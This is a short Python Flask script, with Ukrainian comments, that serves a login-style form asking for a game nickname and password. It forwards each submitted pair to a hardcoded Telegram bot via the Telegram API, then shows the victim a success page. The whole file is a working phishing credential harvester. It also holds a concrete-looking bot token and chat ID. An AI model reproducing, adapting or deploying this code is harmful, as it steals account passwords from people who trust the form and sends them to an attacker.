from flask import Flask, request, render_template
import requests

# 🔹 Замінити на свої дані
TOKEN = "7528723718:AAFubRdlAqyYr9qwxObv1yPhOS9e5d2nvWY"  # 🔸 Встав сюди токен свого бота
CHAT_ID = "5552697337"  # 🔸 Встав сюди свій Telegram ID

TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        nickname = request.form.get("nickname")  # 🔹 Отримуємо нік
        password = request.form.get("password")  # 🔹 Отримуємо пароль
        if nickname and password:
            message = f"📩 Новий запит:\n🎮 Нік: {nickname}\n🔑 Пароль: {password}"
            requests.post(TELEGRAM_API_URL, data={"chat_id": CHAT_ID, "text": message})
        return render_template("index.html", success=True)
    return render_template("index.html", success=False)

if __name__ == "__main__":
    app.run(debug=True)
